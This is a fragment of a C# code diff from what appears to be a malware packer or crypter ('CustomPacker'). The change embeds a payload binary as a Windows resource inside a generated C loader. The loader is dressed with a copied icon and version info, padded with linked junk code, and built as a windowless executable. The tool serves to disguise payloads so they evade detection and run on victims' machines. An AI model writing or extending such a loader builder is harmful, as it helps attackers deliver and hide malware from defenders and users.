                     var resOut = Path.Combine(tempDir, "loader.res");
                     await File.WriteAllTextAsync(rcSrc,
-                        GenerateResourceSource(iconPath, meta, Path.GetFileName(exePath)));
+                        GenerateResourceSource(iconPath, meta, Path.GetFileName(exePath), payloadBin));
                     ok = await RunAsync(rcExe,
                         $"/nologo /fo \"{resOut}\" \"{rcSrc}\"",
                         vsEnv, log, "rc");
                     if (ok && File.Exists(resOut))
                     {
                         resArg = $" \"{resOut}\"";
-                        log("[+] CustomPacker: resource (icon/version) compiled.");
+                        log("[+] CustomPacker: resource (payload + icon/version) compiled.");
                     }
                     else
-                        log("[~] CustomPacker: rc.exe failed — continuing without resources.");
+                        log("[!] CustomPacker: rc.exe failed — cannot embed payload resource.");
                 }
                 else
-                    log("[~] CustomPacker: rc.exe not found — continuing without resources.");
+                    log("[!] CustomPacker: rc.exe not found — payload resource unavailable.");
             }
 
             // 3. Compile C loader + link junk.obj [+ loader.res]
@@ -732,8 +922,8 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
             await File.WriteAllTextAsync(srcPath, loaderSrc);
 
             ok = await RunAsync(clPath,
-                $"\"{srcPath}\" \"{objPath}\"{resArg} /O2 /GS- /MT /W0 /nologo " +
-                $"/Fe\"{outPath}\" kernel32.lib bcrypt.lib cabinet.lib " +
+                $"\"{srcPath}\" \"{objPath}\"{resArg} /O2 /MT /W0 /nologo " +
+                $"/Fe\"{outPath}\" kernel32.lib " +
                 "/link /SUBSYSTEM:WINDOWS /INCREMENTAL:NO /OPT:REF /OPT:ICF",
                 vsEnv, log, "cl");
             if (!ok || !File.Exists(outPath)) return;
